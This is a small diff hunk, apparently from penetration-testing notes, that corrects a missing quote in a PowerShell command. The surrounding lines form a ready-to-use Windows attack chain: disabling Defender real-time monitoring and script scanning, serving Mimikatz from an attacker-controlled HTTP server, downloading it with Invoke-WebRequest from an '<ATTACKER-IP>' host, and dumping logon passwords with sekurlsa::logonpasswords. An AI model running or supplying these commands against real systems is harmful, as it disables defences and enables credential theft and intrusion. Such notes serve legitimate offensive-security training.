@@ -417,7 +417,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -
 python3 -m http.server -d /usr/share/windows-resources/mimikatz/x64 8888
 
 # Download Mimikatz
-invoke-webrequest -Uri &#34;http://&lt;ATTACKER-IP&gt;:8888/mimikatz.exe -outfile mimikatz.exe
+invoke-webrequest -Uri &#34;http://&lt;ATTACKER-IP&gt;:8888/mimikatz.exe&#34; -outfile mimikatz.exe
 
 # Extract NTLM hash with Mimikatz
 .\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34;
